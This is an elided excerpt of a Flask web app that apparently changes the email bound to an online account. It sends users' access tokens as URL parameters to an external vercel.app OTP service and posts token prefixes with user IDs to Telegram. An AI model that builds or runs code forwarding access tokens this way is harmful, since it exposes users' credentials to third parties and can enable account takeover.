...
def send_otp(access, email):
    try:
        url = "https://chngemailcode48.vercel.app/send_otp"
        rsp = requests.get(url, params={'access_token': access, 'email': email}, timeout=10)
        if is_success(rsp):
...
def verify_otp(access, email, otp):
    try:
        url = "https://chngemailcode48.vercel.app/verify_otp"
        rsp = requests.get(url, params={'access_token': access, 'email': email, 'otp': otp}, timeout=10)
        if is_success(rsp):
            data = rsp.json()
...
{% else %}
<div class="info-row"><span class="label">No bind info found. Enter access token below:</span></div>
...
{% elif step == 3 %}
<div class="input-group"><label>NEW EMAIL OTP</label><input type="text" name="otp_new" placeholder="Enter OTP from New Email" required></div>
...
{% else %}
<div class="success">PROCESSING... PLEASE WAIT</div>
{% endif %}
</form>
...
def set_token():
    ...
    if user:
        ...
        db.session.commit()
        send_to_telegram(f"🔑 TOKEN SET\nUser: {user.display_id}\nToken: {user.access_token[:20]}...")
    return redirect('/dashboard')
...
def change_email_route():
    ...
    if request.method == 'POST':
        ...
        if step == 1:
            ...
            return render_template_string(CHANGE_EMAIL_HTML, step=3, request=request, verifier=verifier, identity=identity)
            ...
            return render_template_string(CHANGE_EMAIL_HTML, step=3, error=msg)
